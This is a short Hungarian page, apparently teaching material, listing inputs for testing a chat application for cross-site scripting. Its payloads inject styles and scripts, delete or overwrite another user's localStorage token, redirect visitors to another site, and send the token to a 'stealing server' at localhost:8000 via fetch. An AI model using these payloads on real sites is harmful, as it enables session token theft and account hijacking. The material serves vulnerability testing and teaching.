# Felhasználói dokmentáció

## Lehetséges bemenő adatok

Csevegő sebezhetőség vizsgálathoz.

```html
<style> body { color: navy} </style>
```

```html
<script> print() </script>
```

## Token

* A felhasználó eltesz egy tokent saját böngészőjébe.
* B felhasználó például törölheti

```javascript
<script> console.log(localStorage.removeItem('token')) </script>
```

De beállíthatunk egy saját tokent:

```javascript
<script> console.log(localStorage.setItem('token', 'más')) </script>
```

Küldhetünk átirányítást más webhelyre:

```javascript
<script> location.href='https://szit.hu' </script>
```

## Token megszerzése

Ehhez kell egy lopószerver.

Token elküldése egy szervernek:

```javascript
<script> fetch('http://localhost:8000',{ method: 'POST', headers: { "Content-Type":"application/json" }, body: JSON.stringify({ adat: localStorage.getItem('token') }) }) </script>
```
